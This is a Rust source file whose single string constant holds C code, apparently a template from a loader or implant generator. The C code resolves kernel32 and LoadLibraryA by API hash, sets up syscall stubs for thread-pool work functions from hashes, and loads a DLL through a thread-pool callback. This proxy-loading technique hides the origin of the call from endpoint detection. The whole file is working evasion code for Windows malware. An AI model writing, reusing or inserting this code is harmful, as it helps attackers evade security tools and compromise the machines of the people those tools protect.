pub const PROXYDLL_C: &str = r#"#include "macros.h"
#include "winapi.h"
#include <windows.h>

extern NT_API g_NT_API;
extern NT_CONFIG g_NT_CONFIG;
extern void CALLBACK WorkProxyDllLoadCallBack(PTP_CALLBACK_INSTANCE Instance,
                                              PVOID Context, PTP_WORK Work);

FARPROC pLoadLibrary;
UINT_PTR GetLoadLibrary() { return (UINT_PTR)pLoadLibrary; };

int CheckProxyDllLoadConfig() {
    if (!g_NT_API.TpAllocWork.pSyscallAddress ||
        !g_NT_API.TpPostWork.pSyscallAddress ||
        !g_NT_API.TpReleaseWork.pSyscallAddress) {

        if (!InitNtSyscall(&g_NT_CONFIG, TpAllocWork_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.TpAllocWork)) ||
            !InitNtSyscall(&g_NT_CONFIG, TpPostWork_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.TpPostWork)) ||
            !InitNtSyscall(&g_NT_CONFIG, TpReleaseWork_Hash,
                           S_PTR(NT_SYSCALL, g_NT_API.TpReleaseWork)))
            return 0;
    }
#ifdef DEBUG
    PRINTA("[+] Proxy Dll Load Configure Success\n");
#endif
    return 1;
}
int ProxyDllLoad(LPCSTR DllName) {
#ifdef DEBUG
    PRINTA("[i] Checking Proxy Dll Load Configure\n");
#endif
    if (!CheckProxyDllLoadConfig()) return 0;
    if (!pLoadLibrary) {

        HMODULE hKernel32 = NULL;
        if ((hKernel32 = GetModuleHandleS(KERNEL32_DLL_HASH)) == NULL) {
#ifdef DEBUG
            PRINTA("[-] Failed to Get kernel32 dll handle\n");
#endif
            return 0;
        }
        pLoadLibrary = GetProcAddressS(hKernel32, LOADLIBRARYA_HASH);
#ifdef DEBUG
        PRINTA("[+] LoadLibrary Address: %p\n", B_PTR(pLoadLibrary));
#endif
    }
    PTP_WORK WReturn = NULL;
    CALL((TPALLOCWORK)(g_NT_API.TpAllocWork.pSyscallAddress), &WReturn,
         (PTP_WORK_CALLBACK)WorkProxyDllLoadCallBack, DllName, NULL);
    CALL((TPPOSTWORK)(g_NT_API.TpPostWork.pSyscallAddress), WReturn);
    CALL((TPRELEASEWORK)(g_NT_API.TpReleaseWork.pSyscallAddress), WReturn);

    WaitForSingleObject(NtCurrentProcess(), 0x1000);

    return 1;
}

"#;